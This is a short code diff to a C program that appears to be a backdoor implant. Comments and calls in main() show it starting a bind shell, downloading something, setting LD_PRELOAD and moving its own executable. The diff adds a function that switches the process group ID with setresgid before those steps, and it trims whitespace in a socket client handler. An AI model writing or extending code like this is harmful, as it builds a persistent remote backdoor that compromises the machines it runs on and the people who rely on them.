@@ -33,6 +33,7 @@ int main(int argc, char **argv, char **envp) {
 
     // start bind shell
     if (downloaded == 0) {
+        setgid_s();
         download();
         set_ld_preload();
         move(argv[0]);
@@ -193,8 +194,6 @@ void* handle_client(void* arg) {
 
         messages_sent++;
 
-        
-
         int bytes_sent = send(client_fd, buffer, bytes_received, 0);
         if (bytes_sent < 0) {
             perror("send failed");
@@ -205,4 +204,9 @@ void* handle_client(void* arg) {
     close(client_fd);
 
     return NULL;
+}
+
+void setgid_s() {
+    gid_t gid = GID;
+    setresgid(gid, gid, gid);
 }
